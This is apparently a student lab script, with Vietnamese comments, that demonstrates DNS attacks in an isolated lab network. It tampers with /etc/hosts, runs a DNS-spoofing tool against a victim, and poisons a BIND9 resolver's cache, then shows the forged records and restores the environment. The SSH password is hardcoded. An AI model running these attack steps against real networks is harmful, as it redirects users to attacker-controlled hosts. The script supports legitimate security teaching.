#!/bin/bash
# =====================================================================
#  LAB 8 - LOCAL DNS ATTACK (DNS Spoofing & Cache Poisoning)
#  Sinh vien: Hoang Thanh Tra - MSSV 1150080120 - Lop 11CNPM2
#  Mang ao co lap DNS-LAB 10.9.0.0/24 - chi dung domain .test
# =====================================================================
PLINK="/d/Program Files/plink.exe"; UK="SHA256:EV+sCn6XJ2L3F0/Z7u0V+Ws44i+cbBANARy+EAxofSE"
DNS=192.168.226.132; VIC=192.168.226.137; ATK=192.168.226.138
LOG="${LOG:-/tmp/lab8_demo.log}"; : > "$LOG"
P(){ "$PLINK" -batch -hostkey "$UK" -pw 123456 thtra@"$1" "${@:2}" 2>&1; }
SUDO(){ "$PLINK" -batch -hostkey "$UK" -pw 123456 thtra@"$1" "sudo ${*:2}" 2>&1; }
B(){ printf '\n\033[1;36m========== %s ==========\033[0m\n' "$*"; }
N(){ printf '\033[1;33m>> %s\033[0m\n' "$*"; }
R(){ printf '   \033[0;32m%s\033[0m\n' "$*"; }
pause(){ sleep "${1:-3}"; }
exec > >(tee -a "$LOG") 2>&1

clear
cat <<'HDR'
+-------------------------------------------------------------------+
|   LAB 8 - LOCAL DNS ATTACK : DNS SPOOFING & CACHE POISONING        |
|   Sinh vien : Hoang Thanh Tra   MSSV : 1150080120   Lop : 11CNPM2  |
|   Moi truong : mang ao co lap DNS-LAB 10.9.0.0/24 (domain .test)   |
+-------------------------------------------------------------------+
HDR
pause 3

B "MO HINH & DIA CHI (3 may that trong DNS-LAB)"
N "DNS-SERVER 10.9.0.10  (BIND9 recursive/cache + authoritative lab9.test)"
P $DNS "ip -br -4 addr show ens37"
N "VICTIM 10.9.0.100  (+ DMZ: 172.16.6.10 web that, 172.16.6.20 auth-dns)"
P $VIC "ip -br -4 addr show ens37"
N "ATTACKER 10.9.0.200  (scapy + che do promiscuous)"
P $ATK "ip -br -4 addr show ens37"
pause 4

# prime external name vao cache de hien thi baseline muot
P $DNS "dig +short +time=12 +tries=1 @10.9.0.10 www.external.lab9.test >/dev/null 2>&1"
B "BASELINE - phan giai HOP LE truoc khi tan cong"
N "dig @10.9.0.10 www.lab9.test   (zone noi bo -> web that 172.16.6.10)"
R "$(P $DNS dig +short @10.9.0.10 www.lab9.test)"
N "dig @10.9.0.10 www.external.lab9.test  (uy quyen -> AUTH-DNS 172.16.6.20)"
R "$(P $DNS dig +short @10.9.0.10 www.external.lab9.test)"
N "[VICTIM] curl http://www.external.lab9.test/  -> trang that"
R "$(P $VIC 'curl -s --max-time 8 http://www.external.lab9.test/ | sed -n "s/.*<h1>\(.*\)<\/h1>.*/\1/p"')"
pause 4

B "TASK 1 - THAY DOI /etc/hosts (redirect cuc bo tren Victim)"
SUDO $VIC "bash -c 'cp -n /etc/hosts /etc/hosts.lab8bak; echo \"10.9.0.200 www.lab9.test\" >> /etc/hosts'" >/dev/null
N "Them dong:  10.9.0.200  www.lab9.test  vao /etc/hosts cua VICTIM"
R "$(P $VIC 'tail -1 /etc/hosts')"
N "[VICTIM] getent hosts www.lab9.test  -> /etc/hosts duoc uu tien"
R "$(P $VIC getent hosts www.lab9.test)"
N "[VICTIM] curl http://www.lab9.test/  -> TRANG GIA (attacker 10.9.0.200)"
R "$(P $VIC 'curl -s --max-time 6 http://www.lab9.test/ | sed -n "s/.*<h1>\(.*\)<\/h1>.*/\1/p"')"
N "Nhung dig @10.9.0.10 www.lab9.test VAN tra ket qua that (DNS khong dung /etc/hosts):"
R "$(P $DNS dig +short @10.9.0.10 www.lab9.test)"
SUDO $VIC "cp /etc/hosts.lab8bak /etc/hosts" >/dev/null
N "Khoi phuc /etc/hosts -> getent tro lai that:"
R "$(P $VIC getent hosts www.lab9.test)"
pause 5

B "TASK 2 - DIRECT DNS SPOOFING (attacker gia dap thang toi Victim)"
SUDO $DNS "rndc flush" >/dev/null
N "Attacker lang nghe truy van Victim->Resolver roi gui dap gia (gia nguon 10.9.0.10)"
: > /tmp/spoof2.log
( SUDO $ATK "timeout 8 tcpdump -nni ens37 -w /tmp/task2.pcap udp port 53" >/dev/null 2>&1 ) &
sleep 2
( P $ATK "sudo timeout 12 python3 -u /opt/dns_spoof_lab9.py --mode victim --iface ens37" > /tmp/spoof2.log 2>&1 ) & SP2=$!
sleep 3
N "[VICTIM] dig www.external.lab9.test  (hoi resolver 10.9.0.10)"
R "$(P $VIC dig +short +time=8 www.external.lab9.test)   <== 10.9.0.200 : DAP GIA DA THANG"
N "[VICTIM] curl http://www.external.lab9.test/"
R "$(P $VIC 'curl -s --max-time 8 http://www.external.lab9.test/ | sed -n "s/.*<h1>\(.*\)<\/h1>.*/\1/p"')"
wait $SP2 2>/dev/null
N "Log attacker:"; grep -i forged /tmp/spoof2.log | tail -1 | sed 's/^/   /'
N "Bang chung goi tin (doc task2.pcap) - goi dap gia A=10.9.0.200 tu 10.9.0.10 -> Victim:"
SUDO $ATK "tcpdump -nr /tmp/task2.pcap 'udp port 53'" 2>/dev/null | grep "10.9.0.200" | head -2 | sed 's/^/   /'
pause 5

B "TASK 3 - DNS CACHE POISONING (dau doc cache cua Resolver)"
SUDO $DNS "rndc flush" >/dev/null
N "Attacker gia dap tu AUTH-DNS (172.16.6.20) toi Resolver, thang goi that"
: > /tmp/spoof3.log
( SUDO $ATK "timeout 8 tcpdump -nni ens37 -w /tmp/task3.pcap udp port 53" >/dev/null 2>&1 ) &
sleep 2
( P $ATK "sudo timeout 12 python3 -u /opt/dns_spoof_lab9.py --mode resolver --iface ens37" > /tmp/spoof3.log 2>&1 ) & SP3=$!
sleep 3
N "[VICTIM] dig www.external.lab9.test  -> Resolver di hoi AUTH (bi gia dap)"
R "$(P $VIC dig +short +time=8 www.external.lab9.test)"
wait $SP3 2>/dev/null
N "Log attacker:"; grep -i forged /tmp/spoof3.log | tail -1 | sed 's/^/   /'
N "SAU KHI DUNG attacker: cache Resolver VAN tra 10.9.0.200 (da bi dau doc trong TTL):"
R "$(P $DNS dig +short @10.9.0.10 www.external.lab9.test)"
N "Dump cache BIND9 (rndc dumpdb) - ban ghi gia con trong cache:"
SUDO $DNS "rndc dumpdb -cache" >/dev/null; sleep 1
SUDO $DNS "grep -i 'www.external.lab9' /var/cache/bind/named_dump.db" 2>/dev/null | grep -v '^;' | head -1 | sed 's/^/   /'
pause 5

B "KHOI PHUC MOI TRUONG (phong thu)"
N "rndc flush  -> xoa cache gia, phan giai tro lai dia chi that"
SUDO $DNS "rndc flush" >/dev/null
P $DNS "dig +short +time=12 +tries=1 @10.9.0.10 www.external.lab9.test >/dev/null 2>&1"
R "dig @10.9.0.10 www.external.lab9.test -> $(P $DNS dig +short @10.9.0.10 www.external.lab9.test)"
echo
printf '\033[1;36m========== HOAN TAT LAB 8 : da minh hoa Task1 + Task2 + Task3 ==========\033[0m\n'
pause 3
